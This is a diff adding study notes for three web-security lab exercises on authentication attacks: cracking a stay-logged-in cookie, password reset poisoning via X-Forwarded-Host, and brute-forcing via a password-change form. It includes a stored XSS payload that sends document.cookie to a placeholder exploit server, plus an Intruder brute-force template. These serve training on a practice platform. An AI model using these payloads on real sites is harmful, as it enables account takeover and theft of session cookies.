@@ -182,28 +182,43 @@ Steps:
 ### Offline password cracking
 
 Background: you have creds, you have victims username obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page. 
-- 
 
+- log in with your own account and notice the `Stay logged in` functionality
+- review this like above, finding out that it is base64 encoded with a prefix of the username and an md5 hash of the password value
+- now we need to steal the victims user cookie, the comment functionlity is vulnerable to XSS
+- get the exploit servers URL
+- go to one of the blogs and post a comment containing the following stored XSS payloads: `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
+- in exploit server look for the access log and wait until you see a `GET` request witgh the victims `stay-logged-in` cookie
+- put this cookie in burp and get: `carlos:26323c16d5f4dabff3bb136f2460a943`
+- copy the hash an paste in any search engine to find out the password and log in
 
+### Password reset poisoning via middleware
 
+Background: This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server
 
+- investigate the password reset functionality
+- send `POST /forgot-password` to repeater, notice the `X-Forwarded-Host` header is supported, you can use it to point the dynamically generated reset link to an arbitrary domain
+- get the exploit server URL
+- go back to the request in repeater and add the `X-Forwarded-Host` header with your exploit server URL as the value
+- change `username` param to `carlos` and send the req
+- go to exploit server and open the access log, you should see a `GET /forgot-password` req, which contains the victim's token as a query parameter
+- go back to your email client and copy the valid password reset link, but replace the token with the users and reload it and set the new password for carlos
+- login with the reset password
 
+### Password brute-force via password change
 
+This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page. 
 
+Background: you have creds, and the victims username
 
+this list 
+- [password list](https://portswigger.net/web-security/authentication/auth-lab-passwords)
 
+Steps:
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+- attempt to change password as carlos, send request to intruder `POST /my-account/change-password`
+- in intruder add a payload position to the `current-password parameter` make sure the new password params are set to two different values: `username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc`
+- set password as payload with the above list
+- set grep rule to flag responses containing `New password do not match` and run intruder
+- once finished find the response that contains `New password do not match`
+- log out and log in with carlos and the above password
